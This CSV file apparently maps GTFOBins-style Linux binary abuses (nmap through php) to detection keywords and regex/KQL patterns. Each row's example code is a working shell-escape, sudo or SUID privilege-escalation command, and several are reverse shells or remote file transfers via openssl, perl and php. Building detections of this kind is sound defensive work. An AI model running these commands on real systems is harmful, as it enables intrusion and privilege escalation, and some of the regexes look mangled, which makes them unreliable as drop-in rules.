Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
nmap,sudo,"sudo nmap --interactive
nmap> !sh",sudo --interactive sh,(?i)\b(?:\S*/)?nmap.*sudo.*\-\-interactive.*sh,"@""(?i)\b(?:\S*/)?nmap.*sudo.*\-\-interactive.*sh""",
nmap,limited-suid,"echo 'os.execute(""/bin/sh"")' > $TF
./nmap --script=$TF",echo os.execute /bin/sh --script= /nmap,(?i)\b(?:\S*/)?nmap.*echo.*os\.execute.*/bin/sh.*\-\-script.*/nmap,"@""(?i)\b(?:\S*/)?nmap.*echo.*os\.execute.*/bin/sh.*\-\-script.*/nmap""",
nmap,suid,./nmap -oG=$LFILE DATA,/nmap,(?i)\b(?:\S*/)?nmap.*/nmap,"@""(?i)\b(?:\S*/)?nmap.*/nmap""",
nohup,shell,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",/bin/sh sh tty,(?i)\b(?:\S*/)?nohup.*/bin/sh.*sh.*tty,"@""(?i)\b(?:\S*/)?nohup.*/bin/sh.*sh.*tty""",
nohup,command,"nohup ""$COMMAND""
cat nohup.out",cat nohup.out,(?i)\b(?:\S*/)?nohup.*cat.*nohup\.out,"@""(?i)\b(?:\S*/)?nohup.*cat.*nohup\.out""",
nohup,suid,"./nohup /bin/sh -p -c ""sh -p <$(tty) >$(tty) 2>$(tty)""",/bin/sh sh tty /nohup,(?i)\b(?:\S*/)?nohup.*/bin/sh.*sh.*tty.*/nohup,"@""(?i)\b(?:\S*/)?nohup.*/bin/sh.*sh.*tty.*/nohup""",
nohup,sudo,"sudo nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""",sudo /bin/sh sh tty,(?i)\b(?:\S*/)?nohup.*sudo.*/bin/sh.*sh.*tty,"@""(?i)\b(?:\S*/)?nohup.*sudo.*/bin/sh.*sh.*tty""",
npm,shell,npm exec /bin/sh,exec /bin/sh,(?i)\b(?:\S*/)?npm.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?npm.*exec.*/bin/sh""",
npm,shell,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
npm -C $TF i",echo scripts preinstall /bin/sh TF/package.json /package.json,(?i)\b(?:\S*/)?npm.*echo.*scripts.*preinstall.*/bin/sh.*TF/package\.json.*/package\.json,"@""(?i)\b(?:\S*/)?npm.*echo.*scripts.*preinstall.*/bin/sh.*TF/package\.json.*/package\.json""",
npm,sudo,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i",echo scripts preinstall /bin/sh TF/package.json sudo --unsafe-perm /package.json,(?i)\b(?:\S*/)?npm.*echo.*scripts.*preinstall.*/bin/sh.*TF/package\.json.*sudo.*\-\-unsafe\-perm.*/package\.json,"@""(?i)\b(?:\S*/)?npm.*echo.*scripts.*preinstall.*/bin/sh.*TF/package\.json.*sudo.*\-\-unsafe\-perm.*/package\.json""",
nroff,file-read,nroff $LFILE,,(?i)\b(?:\S*/)?nroff\b,"@""(?i)\b(?:\S*/)?nroff\b""",
nroff,shell,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff",echo /bin/sh TF/groff chmod GROFF_BIN_PATH= /groff,(?i)\b(?:\S*/)?nroff.*echo.*/bin/sh.*TF/groff.*chmod.*GROFF_BIN_PATH.*/groff,"@""(?i)\b(?:\S*/)?nroff.*echo.*/bin/sh.*TF/groff.*chmod.*GROFF_BIN_PATH.*/groff""",
nroff,sudo,"echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff",echo /bin/sh TF/groff chmod sudo GROFF_BIN_PATH= /groff,(?i)\b(?:\S*/)?nroff.*echo.*/bin/sh.*TF/groff.*chmod.*sudo.*GROFF_BIN_PATH.*/groff,"@""(?i)\b(?:\S*/)?nroff.*echo.*/bin/sh.*TF/groff.*chmod.*sudo.*GROFF_BIN_PATH.*/groff""",
nsenter,shell,nsenter /bin/sh,/bin/sh,(?i)\b(?:\S*/)?nsenter.*/bin/sh,"@""(?i)\b(?:\S*/)?nsenter.*/bin/sh""",
nsenter,sudo,sudo nsenter /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?nsenter.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?nsenter.*sudo.*/bin/sh""",
ntpdate,file-read,ntpdate -a x -k $LFILE -d localhost,localhost,(?i)\b(?:\S*/)?ntpdate.*localhost,"@""(?i)\b(?:\S*/)?ntpdate.*localhost""",
ntpdate,sudo,sudo ntpdate -a x -k $LFILE -d localhost,sudo localhost,(?i)\b(?:\S*/)?ntpdate.*sudo.*localhost,"@""(?i)\b(?:\S*/)?ntpdate.*sudo.*localhost""",
ntpdate,suid,./ntpdate -a x -k $LFILE -d localhost,localhost /ntpdate,(?i)\b(?:\S*/)?ntpdate.*localhost.*/ntpdate,"@""(?i)\b(?:\S*/)?ntpdate.*localhost.*/ntpdate""",
octave,shell,"octave-cli --eval 'system(""/bin/sh"")'",octave-cli --eval system /bin/sh,(?i)\b(?:\S*/)?octave.*octave\-cli.*\-\-eval.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?octave.*octave\-cli.*\-\-eval.*system.*/bin/sh""",
octave,file-write,"octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'",octave-cli --eval fid fopen fputs fclose,(?i)\b(?:\S*/)?octave.*octave\-cli.*\-\-eval.*fid.*fopen.*fputs.*fclose,"@""(?i)\b(?:\S*/)?octave.*octave\-cli.*\-\-eval.*fid.*fopen.*fputs.*fclose""",
octave,file-read,"octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",octave-cli --eval format none fid fopen while feof txt fgetl disp endwhile fclose,(?i)\b(?:\S*/)?octave.*octave\-cli.*\-\-eval.*format.*none.*fid.*fopen.*while.*feof,"@""(?i)\b(?:\S*/)?octave.*octave\-cli.*\-\-eval.*format.*none.*fid.*fopen.*while.*feof""",
octave,sudo,"sudo octave-cli --eval 'system(""/bin/sh"")'",sudo octave-cli --eval system /bin/sh,(?i)\b(?:\S*/)?octave.*sudo.*octave\-cli.*\-\-eval.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?octave.*sudo.*octave\-cli.*\-\-eval.*system.*/bin/sh""",
octave,limited-suid,"./octave-cli --eval 'system(""/bin/sh"")'",./octave-cli --eval system /bin/sh /octave-cli,(?i)\b(?:\S*/)?octave.*\./octave\-cli.*\-\-eval.*system.*/bin/sh.*/octave\-cli,"@""(?i)\b(?:\S*/)?octave.*\./octave\-cli.*\-\-eval.*system.*/bin/sh.*/octave\-cli""",
od,file-read,"od -An -c -w9999 ""$LFILE""",,(?i)\b(?:\S*/)?od\b,"@""(?i)\b(?:\S*/)?od\b""",
od,suid,"./od -An -c -w9999 ""$LFILE""",,(?i)\b(?:\S*/)?od\b,"@""(?i)\b(?:\S*/)?od\b""",
od,sudo,"sudo od -An -c -w9999 ""$LFILE""",sudo,(?i)\b(?:\S*/)?od.*sudo,"@""(?i)\b(?:\S*/)?od.*sudo""",
openssl,reverse-shell,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,mkfifo /tmp/s /bin/sh s_client -quiet -connect,(?i)\b(?:\S*/)?openssl.*mkfifo.*/tmp/s.*/bin/sh.*s_client.*\-quiet.*\-connect,"@""(?i)\b(?:\S*/)?openssl.*mkfifo.*/tmp/s.*/bin/sh.*s_client.*\-quiet.*\-connect""",
openssl,file-upload,"openssl s_client -quiet -connect $RHOST:$RPORT < ""$LFILE""",s_client -quiet -connect,(?i)\b(?:\S*/)?openssl.*s_client.*\-quiet.*\-connect,"@""(?i)\b(?:\S*/)?openssl.*s_client.*\-quiet.*\-connect""",
openssl,file-download,"openssl s_client -quiet -connect $RHOST:$RPORT > ""$LFILE""",s_client -quiet -connect,(?i)\b(?:\S*/)?openssl.*s_client.*\-quiet.*\-connect,"@""(?i)\b(?:\S*/)?openssl.*s_client.*\-quiet.*\-connect""",
openssl,file-write,"echo DATA | openssl enc -out ""$LFILE""",echo enc -out,(?i)\b(?:\S*/)?openssl.*echo.*enc.*\-out,"@""(?i)\b(?:\S*/)?openssl.*echo.*enc.*\-out""",
openssl,file-write,"echo ""DATA"" > $TF
openssl enc -in ""$TF"" -out ""$LFILE""",echo enc -out,(?i)\b(?:\S*/)?openssl.*echo.*enc.*\-out,"@""(?i)\b(?:\S*/)?openssl.*echo.*enc.*\-out""",
openssl,file-read,"openssl enc -in ""$LFILE""",enc,(?i)\b(?:\S*/)?openssl.*enc,"@""(?i)\b(?:\S*/)?openssl.*enc""",
openssl,suid,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,mkfifo /tmp/s /bin/sh s_client -quiet -connect /openssl,(?i)\b(?:\S*/)?openssl.*mkfifo.*/tmp/s.*/bin/sh.*s_client.*\-quiet.*\-connect.*/openssl,"@""(?i)\b(?:\S*/)?openssl.*mkfifo.*/tmp/s.*/bin/sh.*s_client.*\-quiet.*\-connect.*/openssl""",
openssl,suid,"echo DATA | openssl enc -out ""$LFILE""",echo enc -out,(?i)\b(?:\S*/)?openssl.*echo.*enc.*\-out,"@""(?i)\b(?:\S*/)?openssl.*echo.*enc.*\-out""",
openssl,sudo,mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s,mkfifo /tmp/s /bin/sh sudo s_client -quiet -connect,(?i)\b(?:\S*/)?openssl.*mkfifo.*/tmp/s.*/bin/sh.*sudo.*s_client.*\-quiet.*\-connect,"@""(?i)\b(?:\S*/)?openssl.*mkfifo.*/tmp/s.*/bin/sh.*sudo.*s_client.*\-quiet.*\-connect""",
openssl,library-load,openssl req -engine ./lib.so,req -engine ./lib.so /lib.so,(?i)\b(?:\S*/)?openssl.*req.*\-engine.*\./lib\.so.*/lib\.so,"@""(?i)\b(?:\S*/)?openssl.*req.*\-engine.*\./lib\.so.*/lib\.so""",
openvpn,shell,openvpn --dev null --script-security 2 --up '/bin/sh -c sh',"""--dev null --script-security /bin/sh sh",(?i)\b(?:\S*/)?openvpn.*\-\-dev.*null.*\-\-script\-security.*/bin/sh.*sh,"@""(?i)\b(?:\S*/)?openvpn.*\-\-dev.*null.*\-\-script\-security.*/bin/sh.*sh""",
openvpn,file-read,"openvpn --config ""$LFILE""","""--config",(?i)\b(?:\S*/)?openvpn.*\-\-config,"@""(?i)\b(?:\S*/)?openvpn.*\-\-config""",
openvpn,suid,"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c ""sh -p""'","""--dev null --script-security /bin/sh sh /openvpn",(?i)\b(?:\S*/)?openvpn.*\-\-dev.*null.*\-\-script\-security.*/bin/sh.*sh.*/openvpn,"@""(?i)\b(?:\S*/)?openvpn.*\-\-dev.*null.*\-\-script\-security.*/bin/sh.*sh.*/openvpn""",
openvpn,suid,"./openvpn --config ""$LFILE""","""--config /openvpn",(?i)\b(?:\S*/)?openvpn.*\-\-config.*/openvpn,"@""(?i)\b(?:\S*/)?openvpn.*\-\-config.*/openvpn""",
openvpn,sudo,sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh',sudo --dev null --script-security /bin/sh sh,(?i)\b(?:\S*/)?openvpn.*sudo.*\-\-dev.*null.*\-\-script\-security.*/bin/sh.*sh,"@""(?i)\b(?:\S*/)?openvpn.*sudo.*\-\-dev.*null.*\-\-script\-security.*/bin/sh.*sh""",
openvpn,sudo,"sudo openvpn --config ""$LFILE""",sudo --config,(?i)\b(?:\S*/)?openvpn.*sudo.*\-\-config,"@""(?i)\b(?:\S*/)?openvpn.*sudo.*\-\-config""",
openvt,sudo,"sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
cat $TF",sudo sh cat,(?i)\b(?:\S*/)?openvt.*sudo.*sh.*cat,"@""(?i)\b(?:\S*/)?openvt.*sudo.*sh.*cat""",
opkg,sudo,sudo opkg install x_1.0_all.deb,sudo install x_1.0_all.deb,(?i)\b(?:\S*/)?opkg.*sudo.*install.*x_1\.0_all\.deb,"@""(?i)\b(?:\S*/)?opkg.*sudo.*install.*x_1\.0_all\.deb""",
pandoc,file-read,"pandoc -t plain ""$LFILE""",plain,(?i)\b(?:\S*/)?pandoc.*plain,"@""(?i)\b(?:\S*/)?pandoc.*plain""",
pandoc,file-write,"echo DATA | pandoc -t plain -o ""$LFILE""",echo plain,(?i)\b(?:\S*/)?pandoc.*echo.*plain,"@""(?i)\b(?:\S*/)?pandoc.*echo.*plain""",
pandoc,shell,"echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null",echo os.execute /bin/sh /dev/null,(?i)\b(?:\S*/)?pandoc.*echo.*os\.execute.*/bin/sh.*/dev/null,"@""(?i)\b(?:\S*/)?pandoc.*echo.*os\.execute.*/bin/sh.*/dev/null""",
pandoc,suid,"echo DATA | ./pandoc -t plain -o ""$LFILE""",echo plain /pandoc,(?i)\b(?:\S*/)?pandoc.*echo.*plain.*/pandoc,"@""(?i)\b(?:\S*/)?pandoc.*echo.*plain.*/pandoc""",
pandoc,limited-suid,"echo 'os.execute(""/bin/sh"")' >$TF
./pandoc -L $TF /dev/null",echo os.execute /bin/sh /dev/null /pandoc,(?i)\b(?:\S*/)?pandoc.*echo.*os\.execute.*/bin/sh.*/dev/null.*/pandoc,"@""(?i)\b(?:\S*/)?pandoc.*echo.*os\.execute.*/bin/sh.*/dev/null.*/pandoc""",
pandoc,sudo,"echo 'os.execute(""/bin/sh"")' >$TF
sudo pandoc -L $TF /dev/null",echo os.execute /bin/sh sudo /dev/null,(?i)\b(?:\S*/)?pandoc.*echo.*os\.execute.*/bin/sh.*sudo.*/dev/null,"@""(?i)\b(?:\S*/)?pandoc.*echo.*os\.execute.*/bin/sh.*sudo.*/dev/null""",
paste,file-read,paste $LFILE,,(?i)\b(?:\S*/)?paste\b,"@""(?i)\b(?:\S*/)?paste\b""",
paste,suid,paste $LFILE,,(?i)\b(?:\S*/)?paste\b,"@""(?i)\b(?:\S*/)?paste\b""",
paste,sudo,sudo paste $LFILE,sudo,(?i)\b(?:\S*/)?paste.*sudo,"@""(?i)\b(?:\S*/)?paste.*sudo""",
pax,file-read,"pax -w ""$LFILE""",,(?i)\b(?:\S*/)?pax\b,"@""(?i)\b(?:\S*/)?pax\b""",
pdb,shell,"echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont",echo import os.system /bin/sh cont,(?i)\b(?:\S*/)?pdb.*echo.*import.*os\.system.*/bin/sh.*cont,"@""(?i)\b(?:\S*/)?pdb.*echo.*import.*os\.system.*/bin/sh.*cont""",
pdb,sudo,"echo 'import os; os.system(""/bin/sh"")' > $TF
sudo pdb $TF
cont",echo import os.system /bin/sh sudo cont,(?i)\b(?:\S*/)?pdb.*echo.*import.*os\.system.*/bin/sh.*sudo.*cont,"@""(?i)\b(?:\S*/)?pdb.*echo.*import.*os\.system.*/bin/sh.*sudo.*cont""",
pdflatex,shell,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',"""--shell-escape documentclass article begin document immediate write18 /bin/sh end",(?i)\b(?:\S*/)?pdflatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh,"@""(?i)\b(?:\S*/)?pdflatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh""",
pdflatex,file-read,"pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -",documentclass article usepackage verbatim begin document verbatiminput end pdftotext article.pdf,(?i)\b(?:\S*/)?pdflatex.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput.*end,"@""(?i)\b(?:\S*/)?pdflatex.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput.*end""",
pdflatex,sudo,"sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -",sudo documentclass article usepackage verbatim begin document verbatiminput end pdftotext article.pdf,(?i)\b(?:\S*/)?pdflatex.*sudo.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput,"@""(?i)\b(?:\S*/)?pdflatex.*sudo.*documentclass.*article.*usepackage.*verbatim.*begin.*document.*verbatiminput""",
pdflatex,sudo,sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',sudo --shell-escape documentclass article begin document immediate write18 /bin/sh end,(?i)\b(?:\S*/)?pdflatex.*sudo.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18,"@""(?i)\b(?:\S*/)?pdflatex.*sudo.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18""",
pdflatex,limited-suid,./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}',"""--shell-escape documentclass article begin document immediate write18 /bin/sh end /pdflatex",(?i)\b(?:\S*/)?pdflatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh,"@""(?i)\b(?:\S*/)?pdflatex.*\-\-shell\-escape.*documentclass.*article.*begin.*document.*immediate.*write18.*/bin/sh""",
pdftex,shell,pdftex --shell-escape '\write18{/bin/sh}\end',"""--shell-escape write18 /bin/sh end",(?i)\b(?:\S*/)?pdftex.*\-\-shell\-escape.*write18.*/bin/sh.*end,"@""(?i)\b(?:\S*/)?pdftex.*\-\-shell\-escape.*write18.*/bin/sh.*end""",
pdftex,sudo,sudo pdftex --shell-escape '\write18{/bin/sh}\end',sudo --shell-escape write18 /bin/sh end,(?i)\b(?:\S*/)?pdftex.*sudo.*\-\-shell\-escape.*write18.*/bin/sh.*end,"@""(?i)\b(?:\S*/)?pdftex.*sudo.*\-\-shell\-escape.*write18.*/bin/sh.*end""",
pdftex,limited-suid,./pdftex --shell-escape '\write18{/bin/sh}\end',"""--shell-escape write18 /bin/sh end /pdftex",(?i)\b(?:\S*/)?pdftex.*\-\-shell\-escape.*write18.*/bin/sh.*end.*/pdftex,"@""(?i)\b(?:\S*/)?pdftex.*\-\-shell\-escape.*write18.*/bin/sh.*end.*/pdftex""",
perf,shell,perf stat /bin/sh,stat /bin/sh,(?i)\b(?:\S*/)?perf.*stat.*/bin/sh,"@""(?i)\b(?:\S*/)?perf.*stat.*/bin/sh""",
perf,suid,./perf stat /bin/sh -p,stat /bin/sh /perf,(?i)\b(?:\S*/)?perf.*stat.*/bin/sh.*/perf,"@""(?i)\b(?:\S*/)?perf.*stat.*/bin/sh.*/perf""",
perf,sudo,sudo perf stat /bin/sh,sudo stat /bin/sh,(?i)\b(?:\S*/)?perf.*sudo.*stat.*/bin/sh,"@""(?i)\b(?:\S*/)?perf.*sudo.*stat.*/bin/sh""",
perl,shell,"perl -e 'exec ""/bin/sh"";'",exec /bin/sh,(?i)\b(?:\S*/)?perl.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?perl.*exec.*/bin/sh""",
perl,file-read,perl -ne print $LFILE,print,(?i)\b(?:\S*/)?perl.*print,"@""(?i)\b(?:\S*/)?perl.*print""",
perl,reverse-shell,"perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",use ENV PF_INET SOCK_STREAM getprotobyname tcp connect sockaddr_in inet_aton open exec /bin/sh,(?i)\b(?:\S*/)?perl.*use.*ENV.*PF_INET.*SOCK_STREAM.*getprotobyname.*tcp.*connect.*sockaddr_in,"@""(?i)\b(?:\S*/)?perl.*use.*ENV.*PF_INET.*SOCK_STREAM.*getprotobyname.*tcp.*connect.*sockaddr_in""",
perl,suid,"./perl -e 'exec ""/bin/sh"";'",exec /bin/sh /perl,(?i)\b(?:\S*/)?perl.*exec.*/bin/sh.*/perl,"@""(?i)\b(?:\S*/)?perl.*exec.*/bin/sh.*/perl""",
perl,sudo,"sudo perl -e 'exec ""/bin/sh"";'",sudo exec /bin/sh,(?i)\b(?:\S*/)?perl.*sudo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?perl.*sudo.*exec.*/bin/sh""",
perl,capabilities,"./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh"";'",use POSIX setuid exec /bin/sh /perl,(?i)\b(?:\S*/)?perl.*use.*POSIX.*setuid.*exec.*/bin/sh.*/perl,"@""(?i)\b(?:\S*/)?perl.*use.*POSIX.*setuid.*exec.*/bin/sh.*/perl""",
perlbug,shell,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',exec /bin/sh,(?i)\b(?:\S*/)?perlbug.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?perlbug.*exec.*/bin/sh""",
perlbug,sudo,sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;',sudo exec /bin/sh,(?i)\b(?:\S*/)?perlbug.*sudo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?perlbug.*sudo.*exec.*/bin/sh""",
pexec,shell,pexec /bin/sh,/bin/sh,(?i)\b(?:\S*/)?pexec.*/bin/sh,"@""(?i)\b(?:\S*/)?pexec.*/bin/sh""",
pexec,suid,./pexec /bin/sh -p,/bin/sh /pexec,(?i)\b(?:\S*/)?pexec.*/bin/sh.*/pexec,"@""(?i)\b(?:\S*/)?pexec.*/bin/sh.*/pexec""",
pexec,sudo,sudo pexec /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?pexec.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?pexec.*sudo.*/bin/sh""",
pg,shell,"pg /etc/profile
!/bin/sh",/etc/profile /bin/sh,(?i)\b(?:\S*/)?pg.*/etc/profile.*/bin/sh,"@""(?i)\b(?:\S*/)?pg.*/etc/profile.*/bin/sh""",
pg,file-read,pg file_to_read,,(?i)\b(?:\S*/)?pg\b,"@""(?i)\b(?:\S*/)?pg\b""",
pg,sudo,"sudo pg /etc/profile
!/bin/sh",sudo /etc/profile /bin/sh,(?i)\b(?:\S*/)?pg.*sudo.*/etc/profile.*/bin/sh,"@""(?i)\b(?:\S*/)?pg.*sudo.*/etc/profile.*/bin/sh""",
pg,suid,./pg file_to_read,,(?i)\b(?:\S*/)?pg\b,"@""(?i)\b(?:\S*/)?pg\b""",
php,shell,"php -r 'system(getenv(""CMD""));'",system getenv,"(?i)\b(?:\S*/)?php.*system.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\)","@""(?i)\b(?:\S*/)?php.*system.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\)""",
php,shell,"php -r 'passthru(getenv(""CMD""));'",passthru getenv,"(?i)\b(?:\S*/)?php.*passthru.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\)","@""(?i)\b(?:\S*/)?php.*passthru.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\)""",
php,shell,"php -r 'print(shell_exec(getenv(""CMD"")));'",print shell_exec getenv,"(?i)\b(?:\S*/)?php.*print.*shell_exec.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\)","@""(?i)\b(?:\S*/)?php.*print.*shell_exec.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\)""",
php,shell,"php -r '$r=array(); exec(getenv(""CMD""), $r); print(join(""\\n"",$r));'",r=array exec getenv print join,"(?i)\b(?:\S*/)?php.*rarray.*exec.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\).*print.*join","@""(?i)\b(?:\S*/)?php.*rarray.*exec.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\).*print.*join""",
php,shell,"php -r '$h=@popen(getenv(""CMD""),""r""); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'",popen getenv while feof echo fread pclose,"(?i)\b(?:\S*/)?php.*popen.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\).*while.*feof.*echo.*fread.*pclose","@""(?i)\b(?:\S*/)?php.*popen.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\).*while.*feof.*echo.*fread.*pclose""",
php,command,"php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(getenv(""CMD""), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'",array pipe proc_open getenv pipes while feof echo fread fclose proc_close,"(?i)\b(?:\S*/)?php.*array.*pipe.*proc_open.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\).*pipes.*while.*feof.*echo","@""(?i)\b(?:\S*/)?php.*array.*pipe.*proc_open.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\).*pipes.*while.*feof.*echo""",
php,reverse-shell,"php -r '$sock=fsockopen(getenv(""RHOST""),getenv(""RPORT""));exec(""/bin/sh -i <&3 >&3 2>&3"");'",sock=fsockopen getenv exec /bin/sh,"(?i)\b(?:\S*/)?php.*sockfsockopen.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\).*exec.*/bin/sh","@""(?i)\b(?:\S*/)?php.*sockfsockopen.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\).*exec.*/bin/sh""",
php,file-upload,php -S $LHOST:$LPORT,,(?i)\b(?:\S*/)?php\b,"@""(?i)\b(?:\S*/)?php\b""",
php,file-download,"php -r '$c=file_get_contents(getenv(""URL""));file_put_contents(getenv(""LFILE""), $c);'",c=file_get_contents getenv file_put_contents,"(?i)\b(?:\S*/)?php.*cfile_get_contents.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\).*file_put_contents\s*\(\s*[\'""""]\S+[\'""""]\s*\)","@""(?i)\b(?:\S*/)?php.*cfile_get_contents.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\).*file_put_contents\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\)""",
php,suid,"./php -r ""pcntl_exec('/bin/sh', ['-p']);""",pcntl_exec /bin/sh /php,(?i)\b(?:\S*/)?php.*pcntl_exec.*/bin/sh.*/php,"@""(?i)\b(?:\S*/)?php.*pcntl_exec.*/bin/sh.*/php""",
php,sudo,"sudo php -r ""system('$CMD');""",sudo system,(?i)\b(?:\S*/)?php.*sudo.*system,"@""(?i)\b(?:\S*/)?php.*sudo.*system""",
php,capabilities,"./php -r ""posix_setuid(0); system('$CMD');""",posix_setuid system /php,(?i)\b(?:\S*/)?php.*posix_setuid\s*\(\s*0\s*\).*system.*/php,"@""(?i)\b(?:\S*/)?php.*posix_setuid\s*\(\s*0\s*\).*system.*/php""",
php,file-read,"php -r 'readfile(getenv(""LFILE""));'",readfile getenv,"(?i)\b(?:\S*/)?php.*readfile.*getenv\s*\(\s*[\'""""]\S+[\'""""]\s*\)","@""(?i)\b(?:\S*/)?php.*readfile.*getenv\s*\(\s*[\'""""""""]\S+[\'""""""""]\s*\)""",
